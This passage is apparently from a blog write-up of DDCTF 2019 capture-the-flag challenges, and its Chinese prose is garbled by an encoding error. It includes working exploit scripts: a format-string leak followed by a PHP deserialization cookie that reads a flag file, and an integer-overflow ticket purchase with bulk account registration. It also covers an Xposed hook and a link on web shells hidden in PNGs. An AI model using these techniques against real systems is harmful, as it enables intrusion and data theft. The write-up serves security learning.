class="variable">$data</span>,<span class="variable">$v</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>,<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></div>

<p>å°† nickname è®¾ç½®ä¸º %s å¯ä»¥æ³„éœ²å‡º key</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://117.51.158.44/app/Session.php&#x27;</span><br><span class="line">cookies = &#123;&#x27;ddctf_id&#x27;:&#x27;a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22ac6ff9a13dbdcd35416e41e7f53cd52f%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A15%3A%22219.218.130.133%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A78%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A66.0%29+Gecko%2F20100101+Firefox%2F66.0%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D728397b258b90c6231b124d3a492bb48&#x27;&#125;</span><br><span class="line">headers = &#123;&#x27;didictf_username&#x27;:&#x27;admin&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&#x27;&#125;</span><br><span class="line">data = &#123;&#x27;nickname&#x27;:&#x27;%s&#x27;&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">r = s.post(url,headers=headers,cookies=cookies,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php&quot;&#125;&#123;&quot;errMsg&quot;:&quot;Welcome&quot;,&quot;data&quot;:&quot;Welcome my friend EzblrbNS&quot;&#125;&#123;&quot;errMsg&quot;:&quot;sucess&quot;,&quot;data&quot;:&quot;DiDI Welcome you Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko\/20100101 Firefox\/66.0&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ° keyï¼šEzblrbNS</p>
<p>ç„¶ååˆ©ç”¨ Application ä¸­ææ„å‡½æ•°è¯»æ–‡ä»¶çš„èƒ½åŠ›è¯»å– flag ï¼Œæ„é€ ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„ cookieã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://117.51.158.44/app/Session.php&#x27;</span><br><span class="line">cookies = &#123;&#x27;ddctf_id&#x27;:&#x27;O%3a11%3a%22Application%22%3a1%3a%7bs%3a4%3a%22path%22%3bs%3a21%3a%22...%2f.%2fconfig%2fflag.txt%22%3b%7d5a014dbe49334e6dbb7326046950bee2&#x27;&#125;</span><br><span class="line">headers = &#123;&#x27;didictf_username&#x27;:&#x27;admin&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&#x27;&#125;</span><br><span class="line">data = &#123;&#x27;nickname&#x27;:&#x27;%s&#x27;&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.post(url,headers=headers,cookies=cookies,data=data)</span><br><span class="line">#r = s.post(url,headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php&quot;&#125;&#123;&quot;errMsg&quot;:&quot;Congratulations&quot;,&quot;data&quot;:&quot;DDCTF&#123;ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>flag:   DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</p>
<h2 id="è”ç›Ÿå†³ç­–å¤§ä¼š"><a href="#è”ç›Ÿå†³ç­–å¤§ä¼š" class="headerlink" title="è”ç›Ÿå†³ç­–å¤§ä¼š"></a>è”ç›Ÿå†³ç­–å¤§ä¼š</h2><p>é¢˜ç›®ç»™å‡ºäº†å¾ˆæ˜ç¡®çš„æç¤ºï¼ŒShamirç§˜å¯†åˆ†äº«æ–¹æ¡ˆï¼Œä» wiki ä¸Šé¢ç®€å•äº†è§£äº†ä¸€ä¸‹åŸç†ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯å°†ä¸€ä¸ªç§˜å¯†æŒ‰ç…§ä¸€å®šçš„ç®—æ³•åˆ†æˆ k ä»½(åˆ†ç»™ k ä¸ªäºº)ï¼Œå¹¶ä¸”åˆ¶å®šäº†ä¸€ä¸ªæ–¹æ¡ˆï¼Œå¤§äºç­‰äº n ä¸ªäºº(n &lt; k) å¯ä»¥å°†è‡ªå·±æ‰‹ä¸­çš„ç§˜å¯†åˆå¹¶èµ·æ¥å¾—åˆ°å®Œæ•´çš„ç§˜å¯†ï¼Œä½†æ˜¯å°äº n ä¸ªäººæ˜¯æ— è®ºå¦‚ä½•éƒ½ä¸èƒ½è§£å‡ºåŸå§‹çš„ç§˜å¯†çš„ã€‚</p>
<p>plaid CTF 2012 æœ‰ä¸€é¢˜å’Œæœ¬é¢˜å¾ˆç›¸ä¼¼ï¼Œè„šæœ¬æ‹¿æ¥ä¿®æ”¹ä¸€ä¸‹</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xC53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</span></span><br><span class="line">pairs = []</span><br><span class="line">pairs += [(<span class="number">1</span>, <span class="number">4470518445270315294253865008865808469591813925340527555511144870776210371333461962571100355988938503377974496098260851399298392762768768321710499151173494</span>)]</span><br><span class="line">pairs += [(<span class="number">2</span>, <span class="number">8941036890540630588507730017731616939183627850681055111022287516566391215447315659339930733926206804504075152291658988777248041197116052099144174634617967</span>)]</span><br><span class="line"><span class="comment"># pairs += [(1, 0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A)]</span></span><br><span class="line"><span class="comment"># pairs += [(2, 0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7)]</span></span><br><span class="line"><span class="comment"># pairs += [(4, 0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC)]</span></span><br><span class="line"><span class="comment"># pairs += [(3, 0x300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA)]</span></span><br><span class="line"><span class="comment"># pairs += [(4, 0x1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9)]</span></span><br><span class="line"><span class="comment"># pairs += [(5, 0x9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45)]</span></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, pair <span class="keyword">in</span> <span class="built_in">enumerate</span>(pairs):</span><br><span class="line">    x, y = pair</span><br><span class="line">    top = <span class="number">1</span></span><br><span class="line">    bottom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j, pair <span class="keyword">in</span> <span class="built_in">enumerate</span>(pairs):</span><br><span class="line">        <span class="keyword">if</span> j == i:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        xj, yj = pair</span><br><span class="line">        top = (top * (-xj)) % p</span><br><span class="line">        bottom = (bottom * (x - xj)) % p</span><br><span class="line">    res += (y * top * invmod(bottom, p)) % p</span><br><span class="line">    res %= p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line"><span class="built_in">print</span> n2s(res)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">pairs = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4470518445270315294253865008865808469591813925340527555511144870776210371333461962571100355988938503377974496098260851399298392762768768321710499151173494</span></span><br><span class="line"><span class="comment"># 8941036890540630588507730017731616939183627850681055111022287516566391215447315659339930733926206804504075152291658988777248041197116052099144174634617967</span></span><br><span class="line"><span class="comment"># DDCTF&#123;5x3ROxvqF2SJrDdVy73IADA04PxdLLab&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>flag:   DDCTF{5x3ROxvqF2SJrDdVy73IADA04PxdLLab}</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯é¢˜ç›®ä¸­æåˆ°äº†ä¸¤ä¸ªç»„ç»‡ï¼Œæˆ‘ä»¬éœ€è¦å¯¹è¿™ä¸¤ä¸ªç»„ç»‡åˆ†åˆ«è§£å¯†ï¼Œä¾‹å¦‚ç»„ç»‡ä¸€çš„å¯†æ–‡ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[(1,0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A)]</span><br><span class="line">[(2,0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7)]</span><br><span class="line">[(4,0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC)]</span><br></pre></td></tr></table></figure></div>

<p>è§£å¯†å¾—åˆ°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">4470518445270315294253865008865808469591813925340527555511144870776210371333461962571100355988938503377974496098260851399298392762768768321710499151173494</span><br></pre></td></tr></table></figure></div>

<p>ä»¥æ­¤ç±»æ¨ï¼Œå¾—åˆ°ç»„ç»‡äºŒ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">8941036890540630588507730017731616939183627850681055111022287516566391215447315659339930733926206804504075152291658988777248041197116052099144174634617967</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååˆ©ç”¨å¯†æ–‡</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pairs += [(1, 4470518445270315294253865008865808469591813925340527555511144870776210371333461962571100355988938503377974496098260851399298392762768768321710499151173494)]</span><br><span class="line">pairs += [(2, 8941036890540630588507730017731616939183627850681055111022287516566391215447315659339930733926206804504075152291658988777248041197116052099144174634617967)]</span><br></pre></td></tr></table></figure></div>

<p>æ‰èƒ½è®¡ç®—å‡º flagã€‚</p>
<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>è¦æ±‚ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œå¹¶ä¸”é‡Œé¢è¦åŒ…å« phpinfo() å­—ç¬¦ä¸²ï¼Œä¹‹å‰çœ‹åˆ°æ¯”è¾ƒç±»ä¼¼çš„é¢˜ç›®ï¼Œç”¨è„šæœ¬å°†å­—ç¬¦ä¸²è—åœ¨å›¾ç‰‡ä¸­å°±å¯ä»¥ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br></pre></td></tr></table></figure></div>

<p>å‚è€ƒé“¾æ¥</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.cnblogs.com/airobot/p/5303762.html</span><br></pre></td></tr></table></figure></div>

<h2 id="Have-Fun"><a href="#Have-Fun" class="headerlink" title="Have Fun"></a>Have Fun</h2><p>JEB åˆ†æï¼ŒJAVA å±‚çš„ä»£ç å¥½åƒç»è¿‡æ··æ·†ï¼Œå¤§éƒ¨åˆ†å˜é‡åå’Œå‡½æ•°åéƒ½è¢«æ›¿æ¢æˆäº†ç‰¹æ®Šå­—ç¬¦ã€‚æ‰¾åˆ°äº†è²Œä¼¼æ˜¯ä¸»è¦å‡½æ•°çš„ä½ç½®</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">key</span><span class="params">(String flag)</span> &#123;</span><br><span class="line">        xq v5;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="number">24</span>;</span><br><span class="line">        <span class="type">byte</span>[] v0_1 = <span class="keyword">new</span> <span class="title class_">byte</span>[v0];</span><br><span class="line">        <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">23</span>;</span><br><span class="line">        <span class="type">byte</span>[] v1_1 = <span class="keyword">new</span> <span class="title class_">byte</span>[v1];</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">v2</span> <span class="operator">=</span> TextUtils.isEmpty(((CharSequence)flag));</span><br><span class="line">        <span class="keyword">if</span>(v2) &#123;</span><br><span class="line">            flag = MainActivity.dec_string(v0_1);</span><br><span class="line">            <span class="built_in">this</span>.î “(flag);</span><br><span class="line">            v5 = <span class="built_in">this</span>.input_flag_here;</span><br><span class="line">            v5.setEnabled(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        flag = <span class="built_in">this</span>.enc(flag);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">v5_1</span> <span class="operator">=</span> JniUtils.helloDidi(flag);</span><br><span class="line">        flag = v5_1 ? MainActivity.dec_string(v1_1) : MainActivity.dec_string(v0_1);</span><br><span class="line">        <span class="built_in">this</span>.î “(flag);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.input_flag_here != <span class="literal">null</span>) &#123;</span><br><span class="line">            v5 = <span class="built_in">this</span>.input_flag_here;</span><br><span class="line">            v5.setEnabled(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¾“å…¥ flag ä¹‹åä¼ å…¥ enc å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åˆè°ƒç”¨äº† assert ä¸­ dex çš„ä»£ç ã€‚</p>
<p>(ç¨‹åºä¸­çš„ä¸€äº›å­—ç¬¦ä¸²ç»è¿‡åŠ å¯†ï¼Œè§£å¯†å‡½æ•°ç”±äºæœªçŸ¥åŸå› ä¸èƒ½åç¼–è¯‘ï¼Œæˆ‘ç¼–å†™äº†ä»¥ä¸‹è„šæœ¬å¯¹å­—ç¬¦ä¸²è§£å¯†)</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">46</span>, -<span class="number">100</span>, <span class="number">13</span>, -<span class="number">127</span>, -<span class="number">18</span>, <span class="number">105</span>]</span><br><span class="line">t = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="built_in">len</span>(s) - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">    temp = (s[i] - s[i - <span class="number">1</span>] - <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line">    t += <span class="built_in">chr</span>(temp)</span><br><span class="line">t += <span class="built_in">chr</span>(s[<span class="number">0</span>] ^ <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(t[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure></div>

<p>æœ€åä¼šä¼ å…¥ so ä¸­è¿›è¡Œå¯¹æ¯”éªŒè¯ï¼Œå¯†æ–‡ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@n|ixihPIppqws</span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯æŒ‰ç…§ dex ä¸­çš„é€»è¾‘å¾€å›æ¨ç®—å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;huao_]D&lt;baafa</span><br></pre></td></tr></table></figure></div>

<p>ç„¶è€Œè¿™ä¸ªä¸œè¥¿è¾“å…¥ç¨‹åºä¸æ­£ç¡®ã€‚</p>
<p>é™æ€åˆ†æåˆ°è¿™é‡Œå°±èµ°ä¸ä¸‹å»äº†ï¼Œäºæ˜¯é‡‡ç”¨åŠ¨æ€åˆ†æçš„åŠæ³•ï¼Œç”¨ android studio + xposed æ‹¦æˆªåŠ å¯†ç»“æœ</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;com.didictf_2019.didicft2019_mobile&quot;</span>.equals(loadPackageParam.packageName)) &#123;</span><br><span class="line">   XposedHelpers.findAndHookMethod(<span class="string">&quot;com.didictf_2019.didicft2019_mobile.JniUtils&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;helloDidi&quot;</span>,String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line"></span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">           <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">           Log.e(<span class="string">&quot;&gt;&quot;</span>,(String) param.args[<span class="number">0</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¾‹å¦‚ï¼Œè¾“å…¥æ ·ä¾‹ä¸º 14 ä¸ª â€˜aâ€™ï¼Œæ‹¦æˆªåˆ°çš„åŠ å¯†ç»“æœä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ihkjmlonqpsrut</span><br></pre></td></tr></table></figure></div>

<p>æ¥ç€è¾“å…¥ 14 ä¸ª â€˜bâ€™ï¼Œå¾—åˆ°è§£å¯†ç»“æœ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jkhinolmrspqvw</span><br></pre></td></tr></table></figure></div>

<p>å¯†æ–‡å¾ˆæœ‰è§„å¾‹ï¼Œå°è¯•å°†å®ƒä»¬åˆ†åˆ«ä¸åŸæ–‡å¼‚æˆ–å‘ç°åŠ å¯†ç®—æ³•å¾ˆç®€å•ï¼ŒæŒ‰ä½ä¸ [8,9,10,11,12,13,14,15,16,17,18,19,20,21] è¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚</p>
<p>å°†åŸå§‹å¯†æ–‡å¼‚æˆ–ä¸Šé¢çš„åˆ—è¡¨å³å¯å¾—åˆ°æ­£ç¡® flagã€‚</p>
<p>flagï¼š Hgvbtdf_Yabbcf</p>
<h2 id="å¤§å‰å¤§åˆ©-ä»Šæ™šåƒé¸¡"><a href="#å¤§å‰å¤§åˆ©-ä»Šæ™šåƒé¸¡" class="headerlink" title="å¤§å‰å¤§åˆ©,ä»Šæ™šåƒé¸¡~"></a>å¤§å‰å¤§åˆ©,ä»Šæ™šåƒé¸¡~</h2><p>æµ‹è¯•æ•´æ•°æº¢å‡ºï¼Œä¹°ç¥¨çš„æ—¶å€™æŠ“åŒ…ï¼Œä¿®æ”¹ç¥¨ä»·ä¸º 4294967296ï¼Œç„¶åå»æ”¯ä»˜é¡µé¢è´­ä¹°ã€‚</p>
<p>ä¹°ç¥¨ä¹‹åè¦é€šè¿‡ id å’Œ ticket ç§»é™¤å¯¹æ‰‹ï¼Œè‡ªå·±é‡æ–°æ³¨å†Œäº†ä¸€ä¸ªè´¦å·å¯ä»¥æˆåŠŸç§»é™¤ï¼Œé‚£ä¹ˆç¼–å†™è„šæœ¬æ‰¹é‡æ³¨å†Œè´¦å·ç§»é™¤å¯¹æ‰‹å°±å¯ä»¥äº†(ç”±äº id çš„åŸå› ï¼Œç§»é™¤çš„å¯¹æ‰‹è¶Šå¤šï¼Œç§»é™¤çš„é€Ÿåº¦å°±è¶Šæ…¢ï¼Œæ‰€ä»¥éœ€è¦å¤šå¼€å‡ ä¸ªè„šæœ¬åŒæ—¶æ‰§è¡Œ)ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">id</span>=[]</span><br><span class="line">ticket=[]</span><br><span class="line">bill_id_str = re.<span class="built_in">compile</span>(<span class="string">&#x27;bill_id&quot;:&quot;([\w-]+)&quot;&#x27;</span>)</span><br><span class="line">ticket_str = re.<span class="built_in">compile</span>(<span class="string">&#x27;&#123;&quot;id&quot;:([\d]+),&quot;ticket&quot;:&quot;([\w]+)&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">id</span>,ticket</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    name=<span class="string">&quot;catalpa&quot;</span>+<span class="built_in">str</span>(name)</span><br><span class="line">    s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/register?name=&quot;</span>+name+<span class="string">&quot;&amp;password=12345678&quot;</span>).text</span><br><span class="line">    s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/login?name=&quot;</span>+name+<span class="string">&quot;&amp;password=12345678&quot;</span>).text</span><br><span class="line">    bill_id= bill_id_str.findall(s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot;</span>).text)[<span class="number">0</span>]</span><br><span class="line">    s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;</span>+bill_id)</span><br><span class="line">    ans= ticket_str.findall(s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/search_ticket&quot;</span>).text)</span><br><span class="line">    url = <span class="string">&quot;http://117.51.147.155:5050/ctf/api/remove_robot?ticket=&quot;</span>+ans[<span class="number">0</span>][<span class="number">1</span>]+<span class="string">&quot;&amp;id=&quot;</span>+ans[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    cookies = &#123;<span class="string">&quot;user_name&quot;</span>: <span class="string">&quot;fuck123123&quot;</span>, <span class="string">&quot;REVEL_SESSION&quot;</span>: <span class="string">&quot;2a98bec870dd806523ce9dcd3e8ebd14&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://117.51.147.155:5050/index.html&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    <span class="built_in">id</span>.append(ans[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    ticket.append(ans[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>,<span class="number">20000</span>):</span><br><span class="line">    exp(<span class="string">&quot;catalpa&quot;</span> + i)</span><br></pre></td></tr></table></figure></div>

<p>flag:   DDCTF{chiken_dinner_hyMCX[n47Fx)}</p>
<h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><p>é¢˜ç›®åå­—å¯èƒ½è¦è¡¨è¾¾ mult xorï¼Œå³å¼‚æˆ–åŠ å¯†ã€‚</p>
<p>ç›´æ¥ç”¨ featherduster  autopwn  ä¸€æŠŠæ¢­ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cryptanalysis of the Enigma ciphering system enabled the western Allies in World War II to read substantial amounts of Morse-coded radio communications of the Axis powers that had been enciphered using Enigma machines. This yielded military intelligence which, along with that from other decrypted Axis radio and teleprinter transmissions, was given the codename Ultra. This was considered by western Supreme Allied Commander Dwight D. Eisenhower to have been &quot;decisive&quot; to the Allied victory.</span><br><span class="line"></span><br><span class="line">The Enigma machines were a family of portable cipher machines with rotor scramblers. Good operating procedures, properly enforced, would have made the plugboard Enigma machine unbreakable. However, most of the German military forces, secret services and civilian agencies that used Enigma employed poor operating procedures, and it was these poor procedures that allowed the Enigma machines to be reverse-engineered and the ciphers to be read.</span><br><span class="line"></span><br><span class="line">The German plugboard-equipped Enigma became Nazi Germany&#x27;s principal crypto-system. It was broken by the Polish General Staff&#x27;s Cipher Bureau in December 1932, with the aid of French-supplied intelligence material obtained from a German spy. A month before the outbreak of World War II, at a conference held near Warsaw, the Polish Cipher Bureau shared its Enigma-breaking techniques and technology with the French and British. During the German invasion of Poland, core Polish Cipher Bureau personnel were evacuated, via Romania, to France where they established the PC Bruno signals intelligence station with French facilities support. Successful cooperation among the Poles, the French, and the British at Bletchley Park continued until June 1940, when France surrendered to the Germans.</span><br><span class="line"></span><br><span class="line">From this beginning, the British Government Code and Cypher School (GC&amp;CS) at Bletchley Park built up an extensive cryptanalytic capability. Initially, the decryption was mainly of Luftwaffe (German air force) and a few Heer (German army) messages, as the Kriegsmarine (German navy) employed much more secure procedures for using Enigma. Alan Turing, a Cambridge University mathematician and logician, provided much of the original thinking that led to the design of the cryptanalytical bombe machines that were instrumental in eventually breaking the naval Enigma. However, the Kriegsmarine introduced an Enigma version with a fourth rotor for its U-boats, resulting in a prolonged period when these messages could not be decrypted. With the capture of relevant cipher keys and the use of much faster US Navy bombes, regular, rapid reading of U-boat messages resumed.</span><br><span class="line"></span><br><span class="line">The flag is: DDCTF&#123;07b1b46d1db28843d1fd76889fea9b36&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="åŒ—äº¬åœ°é“"><a href="#åŒ—äº¬åœ°é“" class="headerlink" title="åŒ—äº¬åœ°é“"></a>åŒ—äº¬åœ°é“</h2><p>æ‹¿åˆ°é¢˜ç›®åˆ†æå›¾ç‰‡ï¼Œç”¨ stegsolve åœ¨ä½é€šé“å–å‡ºäº†ä¸€ä¸² BASE64 ç¼–ç çš„æ•°æ®</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">7SsQWmZ524i/yVWoMeAIJA==</span><br></pre></td></tr></table></figure></div>

<p>ç”¨ BASE64 è§£ä¸å‡ºæ¥ï¼ŒçŒœæƒ³åº”è¯¥æ˜¯è¿˜æœ‰å¦å¤–çš„åŠ å¯†æ‰‹æ®µï¼Œäºæ˜¯ç”¨äº†å„ç§å·¥å…·æµ‹è¯•å›¾ç‰‡ï¼Œæ²¡æœ‰ä»€ä¹ˆç»“æœã€‚</p>
<p>åç»­æ¯”èµ›æ”¾å‡ºæœ€åä¸€ä¸ªæç¤ºï¼Œæ‰çŸ¥é“å¯†é’¥å¯èƒ½è—åœ¨å†…å®¹é‡Œé¢ï¼Œè€Œä¸æ˜¯éšå†™æŠ€å·§ã€‚</p>
